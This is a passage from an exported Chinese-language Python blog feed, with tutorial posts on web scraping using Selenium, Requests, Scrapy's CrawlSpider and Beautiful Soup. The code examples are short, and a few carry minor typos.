class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.get(<span class="string">'https://www.baidu.com/'</span>)</span><br><span class="line">browser.get(<span class="string">'https://www.taobao.com/'</span>)</span><br><span class="line">browser.get(<span class="string">'https://www.python.com/'</span>)</span><br><span class="line">browser.back()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">browser.forward()</span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure><h3 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.get(<span class="string">'https://www.zhihu.com/explore'</span>)</span><br><span class="line">print(browser.get_cookies())</span><br><span class="line">browser.add_cookie(&#123;<span class="string">'name'</span>:<span class="string">'name'</span>,<span class="string">'domain'</span>:<span class="string">'www.zhihu.com'</span>,<span class="string">'value'</span>:<span class="string">'germey'</span>&#125;)</span><br><span class="line">print(browser.get_cookies())</span><br><span class="line">browser.delete_all_cookies()</span><br><span class="line">print(browser.get_cookies())</span><br></pre></td></tr></table></figure><h3 id="选项卡管理"><a href="#选项卡管理" class="headerlink" title="选项卡管理"></a>选项卡管理</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.get(<span class="string">'https://www.baidu.com/'</span>)</span><br><span class="line">browser.execute_script(<span class="string">'window.open()'</span>)</span><br><span class="line">print(browser.window_handles)</span><br><span class="line">browser.switch_to_window(browser.window_handles[<span class="number">1</span>])</span><br><span class="line">browser.get(<span class="string">'https://www.taobao.com/'</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">browser.switch_to_window(browser.window_handles[<span class="number">0</span>])</span><br><span class="line">browser.get(<span class="string">'https://python.org/'</span>)</span><br></pre></td></tr></table></figure><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.get(<span class="string">'https://www.baidu.com/'</span>)</span><br><span class="line">browser.find_element_by_id(<span class="string">'hello'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> TimeoutException,NoSuchElementException</span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    browser.get(<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line"><span class="keyword">except</span> TimeoutException:</span><br><span class="line">    print(<span class="string">'Time Out'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    browser.find_element_by_id(<span class="string">'hello'</span>)</span><br><span class="line"><span class="keyword">except</span> NoSuchElementException:</span><br><span class="line">    print(<span class="string">'No Elemet'</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    browser.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python之Requests库</title>
      <link href="/2020/04/27/Requests%E5%BA%93/"/>
      <url>/2020/04/27/Requests%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Requests库"><a href="#Requests库" class="headerlink" title="Requests库"></a>Requests库</h1><p>Requests库：<a href="http://www.python-requests.org" target="_blank" rel="noopener">http://www.python-requests.org</a></p><p>安装requests库</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580809190000.png"  alt="1580809190000"></p><h3 id="requests库的7个主要方法"><a href="#requests库的7个主要方法" class="headerlink" title="requests库的7个主要方法"></a>requests库的7个主要方法</h3><table><thead><tr><th align="left">方法</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">requests.request()</td><td align="left">构造一个请求，支撑以下各方法的基础</td></tr><tr><td align="left">requests.get()</td><td align="left">获取HTML网页的主要方法，对应的HTTP的GET</td></tr><tr><td align="left">requests.head()</td><td align="left">获取HTML网页头信息的方法，对应HTTP的HEAD</td></tr><tr><td align="left">requests.post()</td><td align="left">向HTML网页提交POST请求方法，对应HTTP的POST</td></tr><tr><td align="left">requests.put()</td><td align="left">向HTML网页提交PUT请求方法，对应HTTP的PUT</td></tr><tr><td align="left">requests.patch()</td><td align="left">向HTML网页提交局部修改请求，对应HTTP的PATCH</td></tr><tr><td align="left">requests.delete()</td><td align="left">向HTML页面提交删除请求，对应HTTP的DELETE</td></tr></tbody></table><h4 id="Requests库的方法解析"><a href="#Requests库的方法解析" class="headerlink" title="Requests库的方法解析"></a>Requests库的方法解析</h4><h5 id="1-requests-request-method-url-kwargs"><a href="#1-requests-request-method-url-kwargs" class="headerlink" title="1. requests.request(method, url, ****kwargs)**"></a><strong>1. requests.request(method, url, ****</strong>kwargs)**</h5><p><strong><em>method：请求方式，对应get/put/post等7种</em></strong></p><ul><li>r = requests.request(‘GET’，url，<strong>**</strong>kwargs)</li><li>r = requests.request(‘HEAD’，url，<strong>**</strong>kwargs)</li><li>r = requests.request(‘POST’，url，<strong>**</strong>kwargs)</li><li>r = requests.request(‘PUT’，url，<strong>**</strong>kwargs)</li><li>r = requests.request(‘PATCH’，url，<strong>**</strong>kwargs)</li><li>r = requests.request(‘delete’，url，<strong>**</strong>kwargs)</li><li>r = requests.request(‘OPTIONS’，url，<strong>**</strong>kwargs)</li></ul><p><strong><em>url：拟获取页面的url链接</em></strong></p><p><strong>*****</strong>kwargs：控制访问的参数，共13个***</p><ul><li><p>params：字典或字节序列，作为参数增加到url中</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580877838128.png"  alt="1580877838128"></p></li><li><p>data：字典、字节序列或文件对象，作为Request的内容</p></li><li><p>json：JSON格式的数据，作为Request的内容</p></li><li><p>headers：字典，HTTP定制头</p></li><li><p>cookies：字典或CookieJar，Request中的cookie</p></li><li><p>author：元组，支持HTTP认证功能</p></li><li><p>files：字典类型，传输文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fs = &#123;<span class="string">'file'</span>:open(<span class="string">'data.xls'</span>,<span class="string">'rb'</span>)&#125;</span><br><span class="line">r = requests.request(<span class="string">'POST'</span>,<span class="string">'http://www.baidu.com'</span>,files=fs)</span><br></pre></td></tr></table></figure></li><li><p>timeout：设定超时时间，秒为单位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = requests.request(<span class="string">'GET'</span>,<span class="string">'http://www.baidu.com'</span>,timeout=<span class="number">10</span>)</span><br></pre></td></tr></table></figure></li><li><p>proxies：字典类型，设定访问代理服务器，可以增加登录认证(<strong>可隐藏用户爬取网页原的ip地址信息</strong>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pxs = &#123;<span class="string">'http'</span>:<span class="string">'http://user:pass@10.10.10.1:1234'</span>,</span><br><span class="line">       <span class="string">'http'</span>:<span class="string">'http://10.10.10.1:4321'</span>&#125;</span><br><span class="line">r = requests.request(<span class="string">'GET'</span>,<span class="string">'http://www.baidu.com'</span>,proxies=pxs)</span><br></pre></td></tr></table></figure></li><li><p>allow_redirects：True/False，默认为True，重定向开关</p></li><li><p>stream：True/False，默认为True，获取内容立即下载开关</p></li><li><p>verify：True/False，默认为True，认证SSL证书开关</p></li><li><p>cert：本地SSL证书路径</p></li></ul><h5 id="2-requests-get-url-params-None-kwargs"><a href="#2-requests-get-url-params-None-kwargs" class="headerlink" title="2.requests.get(url, params=None, **kwargs)"></a>2.requests.get(url, params=None, <strong>**</strong>kwargs)</h5><p><strong><em>url：拟获取页面的url链接</em></strong></p><p><strong><em>params：url中的额外参数，字典或者字节流格式，可选</em></strong></p><p><strong>*****</strong>kwargs：12个控制访问的参数***</p><h5 id="3-requests-head-url-kwargs"><a href="#3-requests-head-url-kwargs" class="headerlink" title="3.requests.head(url, **kwargs)"></a>3.requests.head(url, **kwargs)</h5><p><strong><em>url：拟获取页面的url链接</em></strong></p><p><strong>*****</strong>kwargs：13个控制访问的参数***</p><h5 id="4-requests-post-url-data-None-json-None-kwargs"><a href="#4-requests-post-url-data-None-json-None-kwargs" class="headerlink" title="4.requests.post(url, data=None, json=None, **kwargs)"></a>4.requests.post(url, data=None, json=None, **kwargs)</h5><p><strong><em>url：拟获取页面的url链接</em></strong></p><p><strong><em>data：字典、字节序列或文件，Request的内容</em></strong></p><p><strong><em>json：JSON格式的数据，Request的内容</em></strong></p><p><strong>*****</strong>kwargs：11个控制访问的参数***</p><h5 id="5-requests-put-url-data-None-kwargs"><a href="#5-requests-put-url-data-None-kwargs" class="headerlink" title="5.requests.put(url, data=None, **kwargs)"></a>5.requests.put(url, data=None, **kwargs)</h5><p><strong><em>url：拟获取页面的url链接</em></strong></p><p><strong><em>data：字典、字节序列或文件，Request的内容</em></strong></p><p><strong>*****</strong>kwargs：12个控制访问的参数***</p><h5 id="6-requests-patch-url-data-None-kwargs"><a href="#6-requests-patch-url-data-None-kwargs" class="headerlink" title="6.requests.patch(url, data=None, **kwargs)"></a>6.requests.patch(url, data=None, **kwargs)</h5><p><strong><em>url：拟获取页面的url链接</em></strong></p><p><strong><em>data：字典、字节序列或文件，Request的内容</em></strong></p><p><strong>*****</strong>kwargs：12个控制访问的参数***</p><h5 id="7-requests-delete-url-kwargs"><a href="#7-requests-delete-url-kwargs" class="headerlink" title="7.requests.delete(url,  **kwargs)"></a>7.requests.delete(url,  **kwargs)</h5><p><strong><em>url：拟获取页面的url链接</em></strong></p><p><strong>*****</strong>kwargs：13个控制访问的参数***</p><p>例子：爬取百度的信息</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580810021461.png"  alt="1580810021461"></p><h3 id="Requests库的异常"><a href="#Requests库的异常" class="headerlink" title="Requests库的异常"></a>Requests库的异常</h3><table><thead><tr><th>异常</th><th>说明</th></tr></thead><tbody><tr><td>requests.ConnectionError</td><td>网络连接错误异常，如DNS查询失败、拒绝连接等</td></tr><tr><td>requests.HTTPError</td><td>HTTP错误异常</td></tr><tr><td>requests.URLRequired</td><td>URL缺失异常</td></tr><tr><td>requests.TooManyRedirects</td><td>超过最大重定向次数，产生重定向异常</td></tr><tr><td>requests.ConnectTimeout</td><td>远程连接服务器超时异常</td></tr><tr><td>requests.Timeout</td><td>请求URL超时，产生的超时异常</td></tr></tbody></table><h3 id="理解Requests库的异常"><a href="#理解Requests库的异常" class="headerlink" title="理解Requests库的异常"></a>理解Requests库的异常</h3><table><thead><tr><th>异常</th><th>方法</th></tr></thead><tbody><tr><td>r.raise_for_status()</td><td>如果不是200，产生异常requests.HTTPError</td></tr></tbody></table><h3 id="爬取网页的通用代码框架"><a href="#爬取网页的通用代码框架" class="headerlink" title="爬取网页的通用代码框架"></a>爬取网页的通用代码框架</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url, timeout=<span class="number">30</span>)</span><br><span class="line">        r.raise_for_status()<span class="comment">#如果不是200，产生requests.HTTPError异常</span></span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"产生异常"</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> _name_ == <span class="string">"_main_"</span>:</span><br><span class="line">    url = <span class="string">"http://www.baidu.com"</span></span><br><span class="line">    print(getHTMLText(url))</span><br></pre></td></tr></table></figure><h3 id="HTTP协议及Requests库方法"><a href="#HTTP协议及Requests库方法" class="headerlink" title="HTTP协议及Requests库方法"></a>HTTP协议及Requests库方法</h3><h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><p>HTTP，Hypertext Transfer Protocol，超文本传输协议。</p><p>HTTP是一个基于“请求与响应”模式的、无状态的应用层协议。</p><p>HTTP协议采用URL作为定位网络资源的标识。</p><h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>URL是通过HTTP协议存储资源的Internet路径，一个URL对于一个数据资源。</p><p><strong>URL格式    <a href="http://host[:port]\[path]">http://host[:port]\[path]</a></strong></p><ul><li>host：合法的Internet主机域名或IP地址</li><li>port：端口号，缺省端口为80</li><li>path：请求资源的路径</li></ul><h4 id="HTTP协议对资源的操作"><a href="#HTTP协议对资源的操作" class="headerlink" title="HTTP协议对资源的操作"></a>HTTP协议对资源的操作</h4><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>GET</td><td>请求获取URL位置的资源</td></tr><tr><td>HEAD</td><td>请求获取URL位置资源的响应消息报告，即获得该资源的头部消息</td></tr><tr><td>POST</td><td>请求向URL位置的资源后附加新的数据</td></tr><tr><td>PUT</td><td>请求向URL位置存储一个资源，覆盖原URL位置的资源</td></tr><tr><td>PATCH</td><td>请求局部更新URL位置的资源，即改变该处资源你的部分内容</td></tr><tr><td>DELETE</td><td>请求删除URL位置存储的资源</td></tr></tbody></table><h5 id="PATCH和PUT的区别"><a href="#PATCH和PUT的区别" class="headerlink" title="PATCH和PUT的区别"></a>PATCH和PUT的区别</h5><p>假设URL位置有一组数据UserInfo，包括UserID、UserName等</p><p>需求：用户修改了UserName，其他不变</p><ul><li>采取PATCH，仅向URL提交UserName的局部更新请求。</li><li>采用PUT，必须将所有20个字段一并提交到URL，未提交的字段被删除。</li></ul><p>PATCH的最主要的好处：节省网络带宽</p><h4 id="实例：亚马逊商品页面的爬取"><a href="#实例：亚马逊商品页面的爬取" class="headerlink" title="实例：亚马逊商品页面的爬取"></a>实例：亚马逊商品页面的爬取</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'https://www.amazon.cn/dp/B07TPWBQ3Y?ref_=Oct_DLandingS_D_48449dee_60&amp;smid=A26HDXW89ZT98L'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    kv = &#123;<span class="string">'user-agent'</span>:<span class="string">'Mozilla/5.0'</span>&#125;</span><br><span class="line">    r = requests.get(url,headers=kv)<span class="comment">#修改头部，改为Mozilla/5.0头部</span></span><br><span class="line">    r.raise_for_status()<span class="comment">#如果不是200，产生requests.HTTPError异常</span></span><br><span class="line">    r.encoding = r.apparent_encoding<span class="comment">#改为人类可阅读的编码</span></span><br><span class="line">    print(r.text[<span class="number">1000</span>:<span class="number">2000</span>])<span class="comment">#打印1000~2000行的信息</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure><h4 id="实例：百度360搜索关键字提交"><a href="#实例：百度360搜索关键字提交" class="headerlink" title="实例：百度360搜索关键字提交"></a>实例：百度360搜索关键字提交</h4><p>百度的关键词接口：</p><p><a href="http://www.baidu.com/s?wd=keyword" target="_blank" rel="noopener">http://www.baidu.com/s?wd=keyword</a></p><p>360的关键词接口：</p><p><a href="http://www.so.com/s?q=keyword" target="_blank" rel="noopener">http://www.so.com/s?q=keyword</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">keyword = <span class="string">"Python"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    kv = &#123;<span class="string">'wd'</span>:<span class="string">'Python'</span>&#125;</span><br><span class="line">    r = requests.get(<span class="string">"http://www.baidu.com/s"</span>,params=kv)<span class="comment">#params：字典或字节序列，作为参数增加到url中</span></span><br><span class="line">    print(r.request.url)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    print(len(r.text))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure><h4 id="实例：网络图片的爬取与存储"><a href="#实例：网络图片的爬取与存储" class="headerlink" title="实例：网络图片的爬取与存储"></a>实例：网络图片的爬取与存储</h4><p>网络图片链接格式：</p><p><a href="http://www.example.com/picture.jpg" target="_blank" rel="noopener">http://www.example.com/picture.jpg</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">url = <span class="string">"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1580895731055&amp;di=8700ba330a284d045c1e9f3df8a622b6&amp;imgtype=0&amp;src=http%3A%2F%2Fpic.rmb.bdstatic.com%2Ff79ba62d4fdf35ceea4af90e31226ce1.jpeg"</span></span><br><span class="line">root = <span class="string">"H://pics//"</span><span class="comment">#定义根目录</span></span><br><span class="line">path = root + url.split(<span class="string">'/'</span>)[<span class="number">-1</span>]<span class="comment">#定义路径,根目录+文件名称（与url最后文件名称相同），split()分隔符</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(root):<span class="comment">#os.path.exists()判断文件路径是否存在</span></span><br><span class="line">        os.mkdir(root)<span class="comment">#如果不存在建立一个根目录，os.mkdir()创建目录</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        r = requests.get(url)<span class="comment">#判断文件是否存在，如果不存在通过requests.get获取</span></span><br><span class="line">        <span class="keyword">with</span> open(path, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(r.content)</span><br><span class="line">            f.close()</span><br><span class="line">            print(<span class="string">"文件保存成功"</span>)</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"文件已存在"</span>)</span><br><span class="line"><span class="keyword">except</span>：</span><br><span class="line">print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure><h4 id="实例：IP地址归属地的自动查询"><a href="#实例：IP地址归属地的自动查询" class="headerlink" title="实例：IP地址归属地的自动查询"></a>实例：IP地址归属地的自动查询</h4><p>网络提供查询地址的库：</p><p><a href="http://www.ip138.com/ip.asp?ip=ipaddress" target="_blank" rel="noopener">http://www.ip138.com/ip.asp?ip=ipaddress</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://www.ip138.com/ip.asp?ip="</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(url + <span class="string">'202.204.80.112'</span>)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    print(r.text[<span class="number">-500</span>:])</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Scrapy爬虫框架—CrawlSpider</title>
      <link href="/2020/04/27/CrawlSpider%E7%88%AC%E8%99%AB/"/>
      <url>/2020/04/27/CrawlSpider%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="CrawlSpider"><a href="#CrawlSpider" class="headerlink" title="CrawlSpider"></a>CrawlSpider</h1><p>只要满足某个条件的url，都进行爬取。CrawlSpider 继承自 Spider，只不过是在之前的基础上增加了新的功能，可以定义爬取的url的规则，以后scrapy碰到满足条件的url都进行爬取，而不用 yield Request。</p><h2 id="CrawlSpider爬虫"><a href="#CrawlSpider爬虫" class="headerlink" title="CrawlSpider爬虫"></a>CrawlSpider爬虫</h2><h3 id="创建CrawlSpider爬虫"><a href="#创建CrawlSpider爬虫" class="headerlink" title="创建CrawlSpider爬虫"></a>创建CrawlSpider爬虫</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scrapy genspider -c crawl [爬虫名字] [域名]</span><br><span class="line"></span><br><span class="line">-c crawl：以crawl的模板创建</span><br></pre></td></tr></table></figure><h3 id="LinkExtractors链接提取器"><a href="#LinkExtractors链接提取器" class="headerlink" title="LinkExtractors链接提取器"></a>LinkExtractors链接提取器</h3><p>使用LinkExtractors可以不用程序员自己提取想要的url，然后发送请求。这些工作LinkExtractors可以完成，它会在所有爬虫的页面中找到满足规则的url，实现自动的爬取。以下对LinkExtractors类做简单的介绍：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">scrapy</span>.<span class="title">linkextractors</span>.<span class="title">LinkExtractor</span><span class="params">(</span></span></span><br><span class="line"><span class="class"><span class="params">allow = <span class="params">()</span>,</span></span></span><br><span class="line"><span class="class"><span class="params">    deny = <span class="params">()</span>,</span></span></span><br><span class="line"><span class="class"><span class="params">    allow_domains = <span class="params">()</span>,</span></span></span><br><span class="line"><span class="class"><span class="params">    deny_domains = <span class="params">()</span>,</span></span></span><br><span class="line"><span class="class"><span class="params">    deny_extensions = None,</span></span></span><br><span class="line"><span class="class"><span class="params">    restrict_xpaths = <span class="params">()</span>,</span></span></span><br><span class="line"><span class="class"><span class="params">    tags = <span class="params">(<span class="string">'a'</span>,<span class="string">'area'</span>)</span>,</span></span></span><br><span class="line"><span class="class"><span class="params">    canonicalize = True,</span></span></span><br><span class="line"><span class="class"><span class="params">    unique = True,</span></span></span><br><span class="line"><span class="class"><span class="params">    process_value = None</span></span></span><br><span class="line"><span class="class"><span class="params">)</span></span></span><br></pre></td></tr></table></figure><p>主要参数讲解：</p><ul><li>allow：允许的url。所有满足这个正则表达式的url都会被提取。</li><li>deny：禁止的url。所有满足这个正则表达式的url都不会被提取。</li><li>allow_domains：允许的域名。只有在这个里面指定的域名的url才会被提取。</li><li>deny_domains：禁止的域名。所有在这个里面指定的域名的url都不会被提取。</li><li>restrict_xpaths：严格的xpath。和allow共同过滤连接。</li></ul><h3 id="Rule规则类"><a href="#Rule规则类" class="headerlink" title="Rule规则类"></a>Rule规则类</h3><p>定义爬虫的规则类。一下对Rule类做简单的介绍：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">scrapy</span>.<span class="title">spiders</span>.<span class="title">Rule</span><span class="params">(</span></span></span><br><span class="line"><span class="class"><span class="params">link_extractor,</span></span></span><br><span class="line"><span class="class"><span class="params">    callback = None,</span></span></span><br><span class="line"><span class="class"><span class="params">    cb_kwargs = None,</span></span></span><br><span class="line"><span class="class"><span class="params">    follow = None,</span></span></span><br><span class="line"><span class="class"><span class="params">    process_links = None,</span></span></span><br><span class="line"><span class="class"><span class="params">    process_request = None</span></span></span><br><span class="line"><span class="class"><span class="params">)</span></span></span><br></pre></td></tr></table></figure><p>主要参数讲解：</p><ul><li>link_extractor：一个 LinkExtractor 对象，用于定义爬虫规则。</li><li>callback：满足这个规则的url，应该要执行哪个回调函数。因为CrawlSpider 使用了 parse 作为回调函数，因此不要覆盖 parse 作为回调函数自己的回调函数。</li><li>follow：指定根据该规则从 response 中提取的链接是否需要跟进。</li><li>process_links：从  link_extractor 中获取到链接后会传递这个函数，用来过滤不需要爬取的链接。</li></ul>]]></content>
      
      
      <categories>
          
          <category> python - Scrapy爬虫框架 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python - Scrapy爬虫框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python之Beautiful Soup库</title>
      <link href="/2020/04/27/Beautiful%20Soup%E5%BA%93/"/>
      <url>/2020/04/27/Beautiful%20Soup%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Beautiful-Soup库"><a href="#Beautiful-Soup库" class="headerlink" title="Beautiful Soup库"></a>Beautiful Soup库</h1><p>Beautiful Soup库：<a href="https://www.crummy.com/software/BeautifulSoup/" target="_blank" rel="noopener">https://www.crummy.com/software/BeautifulSoup/</a></p><p>安装Beautiful Soup：</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580889130808.png"  alt="1580889130808"></p><p>使用Beautiful Soup库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup<span class="comment">#这里的BeautifulSoup是个类</span></span><br><span class="line">soup = BeautifulSoup(<span class="string">'&lt;p&gt;data&lt;/p&gt;'</span>,<span class="string">'html.parser'</span>)<span class="comment">#使用html.parser解析器</span></span><br></pre></td></tr></table></figure><p>例子：获取<a href="http://python123.io/ws/demo.html的信息" target="_blank" rel="noopener">http://python123.io/ws/demo.html的信息</a></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580889545054.png"  alt="1580889545054"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580889596462.png"  alt="1580889596462"></p><h3 id="Beautiful-Soup库的基本元素"><a href="#Beautiful-Soup库的基本元素" class="headerlink" title="Beautiful Soup库的基本元素"></a>Beautiful Soup库的基本元素</h3><p>Beautiful Soup库是<strong>解析、遍历、维护“标签树”的功能库</strong>。</p><p>Beautiful Soup库，也叫beautifulsoup4或者bs4。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup<span class="comment">#在bs4库中引入BeautifulSoup类型</span></span><br><span class="line">soup = BeautifulSoup(<span class="string">"&lt;html&gt;data&lt;/html&gt;"</span>,<span class="string">"html.parser"</span>)</span><br><span class="line">soup = BeautifulSoup(<span 